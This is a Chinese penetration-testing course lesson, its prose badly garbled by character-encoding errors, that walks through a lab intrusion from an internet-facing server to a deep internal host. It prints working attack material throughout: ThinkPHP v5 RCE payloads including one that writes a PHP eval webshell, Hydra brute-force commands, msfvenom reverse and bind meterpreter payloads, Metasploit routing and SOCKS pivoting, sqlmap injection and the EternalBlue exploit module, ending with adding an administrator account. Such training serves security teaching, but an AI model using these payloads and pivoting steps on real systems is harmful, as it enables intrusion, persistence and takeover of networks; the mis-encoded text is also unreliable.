![](img/72d7afdc3e43a452b40212a6f5973dec_0.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_2.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_4.png)

# ğŸ› ï¸ ç½‘ç»œå®‰å…¨å°±ä¸šæ¨è - P64ï¼šç¬¬32å¤©ï¼šCobaltStrike Socksä»£ç†

![](img/72d7afdc3e43a452b40212a6f5973dec_6.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_7.png)

## ğŸ“– æ¦‚è¿°
åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åœ¨å†…ç½‘æ¸—é€æµ‹è¯•ä¸­ï¼Œåˆ©ç”¨å·²è·å–æƒé™çš„æœºå™¨ä½œä¸ºè·³æ¿ï¼Œé€šè¿‡å»ºç«‹Socksä»£ç†é€šé“ï¼Œå®ç°å¯¹æ›´æ·±å±‚å†…ç½‘ä¸»æœºçš„è®¿é—®å’Œæ¸—é€ã€‚è¯¾ç¨‹å°†æ¶µç›–ä»å¤–ç½‘çªç ´ã€å†…ç½‘ä¿¡æ¯æ”¶é›†ã€å¤šå±‚ç½‘ç»œç©¿é€åˆ°æœ€ç»ˆè·å–åŸŸå†…ä¸»æœºæƒé™çš„å®Œæ•´æµç¨‹ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_9.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_11.png)

---

## ğŸ” ç¬¬ä¸€é˜¶æ®µï¼šå¤–ç½‘ä¿¡æ¯æ”¶é›†ä¸çªç ´

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬æ€è·¯ã€‚æœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å¯¹æ¢æµ‹åˆ°çš„å¼€æ”¾ç«¯å£è¿›è¡Œæ·±å…¥åˆ†æå’Œåˆ©ç”¨ã€‚

å½“ç›®æ ‡ä¸»æœº80ç«¯å£æ²¡æœ‰æ˜æ˜¾ä¿¡æ¯æ—¶ï¼Œé¦–å…ˆè€ƒè™‘è¿›è¡Œç›®å½•çˆ†ç ´ã€‚å› ä¸ºWebæœåŠ¡é€šå¸¸å…·æœ‰ç‰¹å®šçš„ç›®å½•ç»“æ„ã€‚è®¿é—®ç©ºé¡µé¢å¯èƒ½åªæ˜¯é»˜è®¤é¡µé¢ï¼ˆå¦‚ `index.htm`ï¼‰ï¼Œåœ¨Webæ ¹ç›®å½•ä¸‹å¯èƒ½å­˜åœ¨å…¶ä»–é¡µé¢æˆ–ç›®å½•ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_13.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_15.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_17.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_19.png)

ä»¥ä¸‹æ˜¯é€šè¿‡ç›®å½•çˆ†ç ´å‘ç°æ•æ„Ÿç›®å½•çš„ç¤ºä¾‹ï¼š
```
æ¢æµ‹åˆ° /public ç›®å½•
```
è®¿é—®è¯¥ç›®å½•åï¼Œå¾—åˆ°äº†ä¸€ä¸ª `index.php` é¡µé¢ï¼Œæ˜¾ç¤ºç³»ç»Ÿä½¿ç”¨äº† **ThinkPHP v5** æ¡†æ¶ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_21.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_23.png)

### ç«¯å£æœåŠ¡åˆ†æä¸åˆ©ç”¨æ€è·¯
å¯¹æ‰«æå‘ç°çš„ç«¯å£ï¼ˆå¦‚21, 22, 3306, 8888ï¼‰è¿›è¡Œåˆ†æï¼š
*   **21 (FTP) / 22 (SSH)**ï¼šå°è¯•å¼±å£ä»¤çˆ†ç ´ã€‚å¯ä»¥ä½¿ç”¨ **Hydra** å·¥å…·ã€‚
    ```bash
    hydra -l username -P password_list ftp://target_ip
    hydra -l username -P password_list ssh://target_ip
    ```
*   **3306 (MySQL)**ï¼šè‹¥å…è®¸è¿œç¨‹è¿æ¥ï¼Œå¯å°è¯•å¼±å£ä»¤çˆ†ç ´å¹¶ç›´æ¥è¿æ¥æ•°æ®åº“ã€‚
*   **8888 (å®å¡”é¢æ¿)**ï¼šè®¿é—®éœ€è¦ç‰¹å®šçš„éšæœºè·¯å¾„ï¼Œè‹¥ä¸çŸ¥é“è·¯å¾„åˆ™æ— æ³•è¿›è¡Œç™»å½•çˆ†ç ´ã€‚
*   **80 (HTTP)**ï¼šWebæœåŠ¡æ˜¯å¸¸è§çš„çªç ´å£ã€‚æœ¬æ¬¡åˆ©ç”¨ThinkPHP v5çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´è¿›è¡Œçªç ´ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_25.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_27.png)

### ThinkPHP v5 RCEæ¼æ´åˆ©ç”¨
å‘ç°ThinkPHP v5æ¡†æ¶åï¼Œæœç´¢å…¶å†å²æ¼æ´ï¼Œå‘ç°å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´å…è®¸é€šè¿‡å‘½ä»¤æ‰§è¡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_29.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_31.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_33.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_35.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_37.png)

**æ¼æ´åˆ©ç”¨åŸç†**ï¼š åˆ©ç”¨ `call_user_func_array` å‡½æ•°æ‰§è¡Œå›è°ƒå‡½æ•°ã€‚
*   **POC 1 - éªŒè¯æ¼æ´**ï¼šæ‰§è¡Œ `phpinfo()`ã€‚
    ```php
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
    ```
    é¡µé¢è¾“å‡ºPHPä¿¡æ¯ï¼Œè¯æ˜å­˜åœ¨å‘½ä»¤æ‰§è¡Œã€‚
*   **POC 2 - æ‰§è¡Œç³»ç»Ÿå‘½ä»¤**ï¼šæ‰§è¡Œ `whoami` å‘½ä»¤ã€‚
    ```php
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
    ```
    è¿”å› `www-data`ï¼Œç¡®è®¤å½“å‰æƒé™ã€‚
*   **POC 3 - å†™å…¥WebShell**ï¼šå†™å…¥ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ã€‚
    ```php
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell123.php&vars[1][]=<?php @eval($_POST['cmd']);?>
    ```
    æˆåŠŸå†™å…¥ `shell123.php` æ–‡ä»¶ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_39.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_41.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_43.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_45.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_47.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_49.png)

é€šè¿‡ä¸­å›½èœåˆ€æˆ–èšå‰‘ç­‰å·¥å…·è¿æ¥è¯¥WebShellï¼ŒæˆåŠŸè·å–äº†å¤–ç½‘æœåŠ¡å™¨çš„æ§åˆ¶æƒã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_51.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_53.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_55.png)

---

![](img/72d7afdc3e43a452b40212a6f5973dec_57.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_59.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_61.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_63.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_65.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_67.png)

## ğŸ•µï¸ ç¬¬äºŒé˜¶æ®µï¼šå†…ç½‘ä¿¡æ¯æ”¶é›†ä¸æ¨ªå‘ç§»åŠ¨

![](img/72d7afdc3e43a452b40212a6f5973dec_69.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_71.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_73.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_75.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_77.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_79.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬æˆåŠŸè·å–äº†å¤–ç½‘æœåŠ¡å™¨çš„Shellã€‚æœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•ä»¥è¿™å°æœåŠ¡å™¨ä¸ºè·³æ¿ï¼Œè¿›è¡Œå†…ç½‘æ¸—é€ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_81.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_83.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_85.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_87.png)

### ä¸»æœºä¿¡æ¯æ”¶é›†
é¦–å…ˆå¯¹å·²æ§åˆ¶çš„Linuxä¸»æœºè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä½¿ç”¨ `ifconfig` å‘½ä»¤å‘ç°ä¸¤ä¸ªç½‘å¡ï¼š
*   `eth0`ï¼šå¤–ç½‘IP (78.66.xxx.xxx)
*   `eth1`ï¼šå†…ç½‘IP (192.168.22.1)

![](img/72d7afdc3e43a452b40212a6f5973dec_89.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_91.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_93.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_95.png)

å‘ç°å†…ç½‘ç½‘æ®µ `192.168.22.0/24`ï¼Œæ„å‘³ç€è¿™å°æœºå™¨å¯ä»¥è®¿é—®è¯¥å†…ç½‘ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_97.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_99.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_101.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_103.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_104.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_106.png)

### å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹
ä¸‹ä¸€æ­¥æ˜¯æ¢æµ‹ `192.168.22.0/24` ç½‘å†…å­˜æ´»çš„ä¸»æœºã€‚åœ¨å†…ç½‘ä¸­ï¼Œä½¿ç”¨Pingæ‰«ææ˜¯è¾ƒå¿«çš„æ–¹æ³•ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_108.png)

ä»¥ä¸‹æ˜¯ç”¨äºPingæ‰«æçš„Shellè„šæœ¬ï¼š
```bash
#!/bin/bash
for i in {1..254}
do
    ip="192.168.22.$i"
    ping -c 1 -W 1 $ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "$ip is OK"
    else
        echo "$ip is NO"
    fi
done
```
**è„šæœ¬è¯´æ˜**ï¼š
*   `-c 1`ï¼šå‘é€1ä¸ªpingåŒ…ã€‚
*   `-W 1`ï¼šç­‰å¾…1ç§’è¶…æ—¶ã€‚
*   `> /dev/null 2>&1`ï¼šå°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ç©ºè®¾å¤‡ï¼Œä¸æ˜¾ç¤ºã€‚
*   é€šè¿‡ `$?` åˆ¤æ–­ä¸Šä¸€æ¡å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œ0è¡¨ç¤ºæˆåŠŸï¼ˆä¸»æœºå­˜æ´»ï¼‰ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_110.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_112.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_114.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_116.png)

å°†è„šæœ¬ä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨çš„ `/tmp` ç›®å½•ï¼ˆè¯¥ç›®å½•é€šå¸¸æƒé™ä¸º777ï¼‰ï¼Œæ·»åŠ æ‰§è¡Œæƒé™å¹¶è¿è¡Œï¼š
```bash
chmod +x ping_scan.sh
./ping_scan.sh > ip_list.txt
```
æ‰«æå‘ç°é™¤äº†æœ¬æœºï¼ˆ192.168.22.1ï¼‰å¤–ï¼Œä¸»æœº `192.168.22.2` å­˜æ´»ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_118.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_120.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_122.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_124.png)

---

![](img/72d7afdc3e43a452b40212a6f5973dec_126.png)

## ğŸ”„ ç¬¬ä¸‰é˜¶æ®µï¼šå»ºç«‹ä»£ç†é€šé“ä¸å†…ç½‘ç©¿é€

![](img/72d7afdc3e43a452b40212a6f5973dec_128.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_130.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_132.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬å‘ç°äº†å†…ç½‘å­˜æ´»ä¸»æœºã€‚æœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•è®¿é—®å’Œæµ‹è¯•è¿™äº›å†…ç½‘ä¸»æœºã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_134.png)

### åå¼¹Shellåˆ°MSF
ä¸ºäº†ä½¿ç”¨æ›´å¼ºå¤§çš„å·¥å…·ï¼ˆå¦‚MSFçš„ç«¯å£æ‰«ææ¨¡å—ï¼‰ï¼Œå…ˆå°†è·å–çš„WebShellåå¼¹åˆ°Metasploitæ¡†æ¶ã€‚

1.  **ç”ŸæˆLinuxæœ¨é©¬**ï¼šä½¿ç”¨ `msfvenom` ç”ŸæˆELFæ ¼å¼çš„åå¼¹Shellã€‚
    ```bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=your_ip LPORT=6667 -f elf -o mngy.elf
    ```
2.  **ä¸Šä¼ å¹¶æ‰§è¡Œ**ï¼šå°† `mngy.elf` ä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨ `/tmp` ç›®å½•ï¼Œæ·»åŠ æ‰§è¡Œæƒé™å¹¶è¿è¡Œã€‚
    ```bash
    chmod +x mngy.elf
    ./mngy.elf
    ```
3.  **MSFè®¾ç½®ç›‘å¬**ï¼šåœ¨MSFä¸­è®¾ç½®å¯¹åº”çš„Payloadè¿›è¡Œç›‘å¬ï¼ŒæˆåŠŸæ¥æ”¶åˆ° `meterpreter` ä¼šè¯ï¼ˆsession 5ï¼‰ã€‚

### æ·»åŠ è·¯ç”±ä¸å»ºç«‹Socksä»£ç†
ç°åœ¨éœ€è¦é€šè¿‡MSFä¼šè¯è®¿é—®å†…ç½‘ `192.168.22.0/24` ç½‘æ®µã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_136.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_138.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_140.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_142.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_144.png)

1.  **æ·»åŠ è·¯ç”±**ï¼šå‘Šè¯‰MSFï¼Œè®¿é—® `192.168.22.0/24` ç½‘æ®µçš„æµé‡éœ€è¦é€šè¿‡session 5è½¬å‘ã€‚
    ```bash
    run autoroute -s 192.168.22.0/24
    ```
2.  **å¯åŠ¨Socks5ä»£ç†æœåŠ¡**ï¼šåœ¨MSFä¸­å¯åŠ¨ä¸€ä¸ªSocks5ä»£ç†æœåŠ¡å™¨ï¼Œç›‘å¬åœ¨æœ¬åœ°çš„1080ç«¯å£ã€‚
    ```bash
    use auxiliary/server/socks_proxy
    set VERSION 5
    run
    ```
3.  **é…ç½®ä»£ç†å·¥å…·**ï¼šåœ¨æ”»å‡»æœºä¸Šé…ç½®å·¥å…·ï¼ˆå¦‚æµè§ˆå™¨ã€Nmapï¼‰é€šè¿‡Socks5ä»£ç†ï¼ˆ127.0.0.1:1080ï¼‰è¿›è¡Œè®¿é—®ã€‚

**æµé‡èµ°å‘**ï¼šæ”»å‡»æœºå·¥å…· -> æœ¬åœ°1080ç«¯å£ï¼ˆSocksä»£ç†ï¼‰-> MSFæ¡†æ¶ -> é€šè¿‡session 5ï¼ˆè·³æ¿æœºï¼‰-> ç›®æ ‡å†…ç½‘ä¸»æœºã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_146.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_148.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_150.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_152.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_154.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_156.png)

### æµ‹è¯•ä»£ç†é€šé“
ä½¿ç”¨ `proxychains` å·¥å…·è®©å‘½ä»¤è¡Œç¨‹åºèµ°ä»£ç†ã€‚
```bash
proxychains curl http://192.168.22.2
```
æˆåŠŸè®¿é—®åˆ°å†…ç½‘ä¸»æœº `192.168.22.2` çš„Webé¡µé¢ï¼Œè¯æ˜ä»£ç†é€šé“å»ºç«‹æˆåŠŸã€‚

---

![](img/72d7afdc3e43a452b40212a6f5973dec_158.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_160.png)

## ğŸ¯ ç¬¬å››é˜¶æ®µï¼šå†…ç½‘çºµæ·±æ¸—é€

![](img/72d7afdc3e43a452b40212a6f5973dec_162.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_164.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_166.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_168.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_170.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_172.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬å»ºç«‹äº†è®¿é—®å†…ç½‘çš„é€šé“ã€‚æœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å¯¹å†…ç½‘ä¸»æœºè¿›è¡Œæ¸—é€ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_174.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_176.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_178.png)

### æ‰«æå†…ç½‘ä¸»æœºç«¯å£
é€šè¿‡ä»£ç†é€šé“ï¼Œä½¿ç”¨Nmapæ‰«æå†…ç½‘ä¸»æœº `192.168.22.2` çš„å¼€æ”¾ç«¯å£ã€‚
```bash
proxychains nmap -sT -Pn 192.168.22.2
```
**å‚æ•°è¯´æ˜**ï¼š
*   `-sT`ï¼šTCPè¿æ¥æ‰«æã€‚
*   `-Pn`ï¼šè·³è¿‡ä¸»æœºå‘ç°ï¼ˆPingæ‰«æï¼‰ï¼Œå› ä¸ºICMPæµé‡å¯èƒ½æ— æ³•é€šè¿‡ä»£ç†ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_180.png)

æ‰«æå‘ç°è¯¥ä¸»æœºå¼€æ”¾äº†80ç«¯å£ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_182.png)

### æ¸—é€å†…ç½‘WebæœåŠ¡
è®¿é—® `192.168.22.2:80`ï¼Œå‘ç°æ˜¯ä¸€ä¸ªCMSç³»ç»Ÿã€‚é€šè¿‡æœç´¢å†å²æ¼æ´ï¼Œå‘ç°å­˜åœ¨SQLæ³¨å…¥ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_184.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_186.png)

1.  **SQLæ³¨å…¥è·å–åå°å¯†ç **ï¼šä½¿ç”¨ `sqlmap` é€šè¿‡ä»£ç†è¿›è¡Œæ³¨å…¥æµ‹è¯•ã€‚
    ```bash
    proxychains sqlmap -u "http://192.168.22.2/vuln.php?id=1" --batch
    ```
    æˆåŠŸè·‘å‡ºç®¡ç†å‘˜è´¦å·å¯†ç ã€‚
2.  **ç™»å½•åå°å¹¶å†™å…¥WebShell**ï¼šæ‰¾åˆ°åå°ç™»å½•åœ°å€ï¼Œä½¿ç”¨è·å–çš„å¯†ç ç™»å½•ã€‚åœ¨CMSçš„æ¨¡æ¿ç¼–è¾‘åŠŸèƒ½ä¸­ï¼Œå‘é¦–é¡µæ–‡ä»¶å†™å…¥PHPä¸€å¥è¯æœ¨é©¬ã€‚
3.  **è¿æ¥WebShell**ï¼šä½¿ç”¨ä¸­å›½èœåˆ€æˆ–èšå‰‘ï¼Œé…ç½®Socks5ä»£ç†åï¼ŒæˆåŠŸè¿æ¥å†…ç½‘ä¸»æœºçš„WebShellã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_188.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_190.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_192.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_194.png)

### ä¿¡æ¯æ”¶é›†ä¸å‘ç°æ–°ç½‘æ®µ
åœ¨ `192.168.22.2` ä¸»æœºä¸Šæ‰§è¡Œ `ifconfig`ï¼Œå‘ç°å…¶è¿˜æœ‰å¦ä¸€å¼ ç½‘å¡ï¼Œå¤„äº `192.168.33.0/24` ç½‘æ®µã€‚è¿™æ„å‘³ç€å­˜åœ¨æ›´æ·±å±‚çš„å†…ç½‘ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_196.png)

### å¤šå±‚ç½‘ç»œç©¿é€
ä¸»æœº `192.168.22.2` æ— æ³•ç›´æ¥å‡ºç½‘ï¼Œå› æ­¤ä½¿ç”¨æ­£å‘Shellå°†å…¶è¿æ¥åˆ°MSFã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_198.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_200.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_202.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_204.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_206.png)

1.  **ç”Ÿæˆæ­£å‘Shellæœ¨é©¬**ï¼š
    ```bash
    msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=6668 -f elf -o mngy2.elf
    ```
2.  **ä¸Šä¼ å¹¶æ‰§è¡Œ**ï¼šåœ¨ `192.168.22.2` ä¸Šæ‰§è¡Œè¯¥æœ¨é©¬ï¼Œç›‘å¬6668ç«¯å£ã€‚
3.  **MSFè¿æ¥æ­£å‘Shell**ï¼šåœ¨MSFä¸­ä½¿ç”¨ `bind_tcp` payloadè¿æ¥è¯¥ç«¯å£ï¼Œè·å¾—æ–°çš„sessionï¼ˆsession 7ï¼‰ã€‚
4.  **æ·»åŠ æ–°è·¯ç”±**ï¼šä¸ºæ–°çš„sessionæ·»åŠ é€šå¾€ `192.168.33.0/24` ç½‘æ®µçš„è·¯ç”±ã€‚
    ```bash
    run autoroute -s 192.168.33.0/24
    ```

![](img/72d7afdc3e43a452b40212a6f5973dec_208.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_210.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_212.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_214.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_216.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_218.png)

### æ¸—é€æœ€ç»ˆç›®æ ‡
é€šè¿‡ä»£ç†æ‰«æ `192.168.33.33`ï¼Œå‘ç°å¼€æ”¾äº†445ç«¯å£ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_220.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_222.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_224.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_226.png)

1.  **åˆ©ç”¨æ°¸æ’ä¹‹è“æ¼æ´**ï¼šä½¿ç”¨MSFçš„ `ms17_010_eternalblue` æ¨¡å—æ”»å‡»è¯¥ä¸»æœºã€‚
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.33.33
    set payload windows/x64/meterpreter/bind_tcp
    exploit
    ```
    æˆåŠŸè·å– `SYSTEM` æƒé™çš„Shellï¼ˆsession 8ï¼‰ã€‚
2.  **æ·»åŠ ç”¨æˆ·å¹¶è¿œç¨‹æ¡Œé¢è¿æ¥**ï¼šé€šè¿‡è·å–çš„Shellæ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå¹¶åˆ©ç”¨å…¶å¼€æ”¾çš„3389ç«¯å£è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥ã€‚
    *   **æ–¹æ³•ä¸€ï¼ˆLinuxï¼‰**ï¼šä½¿ç”¨ `rdesktop` é€šè¿‡ä»£ç†è¿æ¥ã€‚
        ```bash
        proxychains rdesktop 192.168.33.33
        ```
    *   **æ–¹æ³•äºŒï¼ˆWindowsï¼‰**ï¼šä½¿ç”¨ `Proxifier` ç­‰å…¨å±€ä»£ç†å·¥å…·ï¼Œè®© `mstsc.exe`ï¼ˆè¿œç¨‹æ¡Œé¢è¿æ¥ï¼‰çš„æµé‡èµ°Socks5ä»£ç†ï¼Œç„¶åè¿›è¡Œè¿æ¥ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_228.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_230.png)

---

![](img/72d7afdc3e43a452b40212a6f5973dec_232.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_234.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_236.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_238.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_240.png)

## ğŸ“ æ€»ç»“
æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†ä»å¤–ç½‘åˆ°å†…ç½‘çš„å®Œæ•´æ¸—é€æµç¨‹ï¼š
1.  **å¤–ç½‘çªç ´**ï¼šé€šè¿‡Webæ¼æ´ï¼ˆThinkPHP RCEï¼‰è·å–å¤–ç½‘æœåŠ¡å™¨Shellã€‚
2.  **ä¿¡æ¯æ”¶é›†**ï¼šå‘ç°å†…ç½‘ç½‘æ®µï¼Œæ¢æµ‹å­˜æ´»ä¸»æœºã€‚
3.  **ä»£ç†æ­å»º**ï¼šå°†Shellåå¼¹è‡³MSFï¼Œæ·»åŠ è·¯ç”±å¹¶å»ºç«‹Socks5ä»£ç†é€šé“ï¼Œå®ç°å†…ç½‘ç©¿é€ã€‚
4.  **æ¨ªå‘ç§»åŠ¨**ï¼šé€šè¿‡ä»£ç†æ¸—é€å†…ç½‘ä¸»æœºï¼Œå¹¶ä»¥æ­¤ä¸ºæ–°çš„è·³æ¿ï¼Œå‘æ›´æ·±å±‚ç½‘ç»œï¼ˆ192.168.33.0/24ï¼‰æ¸—é€ã€‚
5.  **æœ€ç»ˆæ§åˆ¶**ï¼šåˆ©ç”¨ç³»ç»Ÿæ¼æ´ï¼ˆMS17-010ï¼‰è·å–åŸŸå†…æœ€ç»ˆç›®æ ‡ä¸»æœºçš„æœ€é«˜æƒé™ï¼Œå¹¶é€šè¿‡ä»£ç†å®ç°è¿œç¨‹æ¡Œé¢æ§åˆ¶ã€‚

![](img/72d7afdc3e43a452b40212a6f5973dec_242.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_244.png)

![](img/72d7afdc3e43a452b40212a6f5973dec_246.png)

æ ¸å¿ƒåœ¨äºåˆ©ç”¨ **å·²æ§ä¸»æœºä½œä¸ºè·³æ¿**ï¼Œé€šè¿‡ **è·¯ç”±** å’Œ **Socksä»£ç†** å°†æ”»å‡»æµé‡é€å±‚è½¬å‘ï¼Œæœ€ç»ˆå®ç°å¯¹å¤šå±‚å†…ç½‘ç»“æ„çš„æ¸—é€ã€‚